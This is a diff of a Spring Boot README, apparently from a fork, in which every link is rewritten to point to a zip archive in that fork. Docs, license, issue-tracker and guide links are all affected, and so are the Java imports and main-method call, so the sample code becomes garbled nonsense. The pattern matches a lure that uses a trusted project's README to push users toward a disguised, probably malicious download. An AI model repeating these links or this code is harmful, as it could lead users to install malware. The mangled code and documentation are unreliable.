@@ -1,5 +1,5 @@
-= Spring Boot https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip["Build Status", link="https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip"] https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip["Chat",link="https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip"]
-:docs: https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip
+= Spring Boot https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip["Build Status", link="https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip"] https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip["Chat",link="https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip"]
+:docs: https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip
 
 Spring Boot makes it easy to create Spring-powered, production-grade applications and
 services with absolute minimum fuss. It takes an opinionated view of the Spring platform
@@ -26,16 +26,16 @@ The {docs}/htmlsingle/[reference documentation] includes detailed
 {docs}/htmlsingle/#getting-started-installing-spring-boot[installation instructions]
 as well as a comprehensive {docs}/htmlsingle/#getting-started-first-application[``getting
 started``] guide. Documentation is published in {docs}/htmlsingle/[HTML],
-{docs}https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[PDF] and {docs}https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[EPUB]
+{docs}https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[PDF] and {docs}https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[EPUB]
 formats.
 
 Here is a quick teaser of a complete Spring Boot application in Java:
 
 [source,java,indent=0]
 ----
-	import https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip*;
-	import https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip*;
-	import https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip*;
+	import https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip*;
+	import https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip*;
+	import https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip*;
 
 	@RestController
 	@EnableAutoConfiguration
@@ -47,7 +47,7 @@ Here is a quick teaser of a complete Spring Boot application in Java:
 		}
 
 		public static void main(String[] args) throws Exception {
-			https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip, args);
+			https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip(https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip, args);
 		}
 
 	}
@@ -62,11 +62,11 @@ Having trouble with Spring Boot? We'd like to help!
   {docs}/htmlsingle/#howto[How-to's] -- they provide solutions to the most common
   questions.
 * Learn the Spring basics -- Spring Boot builds on many other Spring projects, check
-  the https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip] web-site for a wealth of reference documentation. If
-  you are just starting out with Spring, try one of the https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[guides].
-* Ask a questions - we monitor https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip] for questions
-  tagged with https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[`spring-boot`].
-* Report bugs with Spring Boot at https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip].
+  the https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip] web-site for a wealth of reference documentation. If
+  you are just starting out with Spring, try one of the https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[guides].
+* Ask a questions - we monitor https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip] for questions
+  tagged with https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[`spring-boot`].
+* Report bugs with Spring Boot at https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip].
 
 
 
@@ -74,9 +74,9 @@ Having trouble with Spring Boot? We'd like to help!
 Spring Boot uses GitHub's integrated issue tracking system to record bugs and feature
 requests. If you want to raise an issue, please follow the recommendations below:
 
-* Before you log a bug, please https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[search the issue tracker]
+* Before you log a bug, please https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[search the issue tracker]
   to see if someone has already reported the problem.
-* If the issue doesn't already exist, https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[create a new issue].
+* If the issue doesn't already exist, https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[create a new issue].
 * Please provide as much information as possible with the issue report, we like to know
   the version of Spring Boot that you are using, as well as your Operating System and
   JVM version.
@@ -84,16 +84,16 @@ requests. If you want to raise an issue, please follow the recommendations below
   before and after your text.
 * If possible try to create a test-case or project that replicates the issue. You can
   submit sample projects as pull-requests against the
-  https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[spring-boot-issues] GitHub
+  https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[spring-boot-issues] GitHub
   project. Use the issue number for the name of your project.
 
 
 
 == Building from Source
 You don't need to build from source to use Spring Boot (binaries in
-https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip]), but if you want to try out the latest and
+https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip]), but if you want to try out the latest and
 greatest, Spring Boot can be easily built with the
-https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[maven wrapper]. You also need JDK 1.8 (although
+https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[maven wrapper]. You also need JDK 1.8 (although
 Boot applications can run on Java 1.6).
 
 [indent=0]
@@ -102,7 +102,7 @@ Boot applications can run on Java 1.6).
 ----
 
 If you want to build with the regular `mvn` command, you will need
-https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Maven v3.0.5 or above].
+https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Maven v3.0.5 or above].
 
 NOTE: You may need to increase the amount of memory available to Maven by setting
 a `MAVEN_OPTS` environment variable with the value `-Xmx512m`. Remember
@@ -111,9 +111,9 @@ tests there (e.g. in Eclipse go to `Preferences->Java->Installed JREs` and edit 
 JRE definition so that all processes are launched with those arguments). This property
 is automatically set if you use the maven wrapper.
 
-_Also see https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip] if you wish to submit pull requests,
+_Also see https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip] if you wish to submit pull requests,
 and in particular please fill out the
-https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Contributor's Agreement]
+https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Contributor's Agreement]
 before your first change however trivial. (Or if you filed such an agreement already for
 another project just mention that in your pull request.)_
 
@@ -215,20 +215,20 @@ be built with maven and run by invoking `java -jar target/<sample>.jar`.
 
 
 == Guides
-The https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip] site contains several guides that show how to use Spring
+The https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip] site contains several guides that show how to use Spring
 Boot step-by-step:
 
-* https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Building an Application with Spring Boot] is a
+* https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Building an Application with Spring Boot] is a
   very basic guide that shows you how to create a simple application, run it and add some
   management services.
-* https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Building a RESTful Web Service with Spring
+* https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Building a RESTful Web Service with Spring
   Boot Actuator] is a guide to creating a REST web service and also shows how the server
   can be configured.
-* https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Converting a Spring Boot JAR Application
+* https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Converting a Spring Boot JAR Application
   to a WAR] shows you how to run applications in a web server as a WAR file.
 
 
 
 == License
 Spring Boot is Open Source software released under the
-https://github.com/huizuohaode/spring-boot/releases/download/v1.0/Software.zip[Apache 2.0 license].
+https://raw.githubusercontent.com/huizuohaode/spring-boot/master/spring-boot-cli/src/main/content/shell-completion/spring_boot_v1.6.zip[Apache 2.0 license].
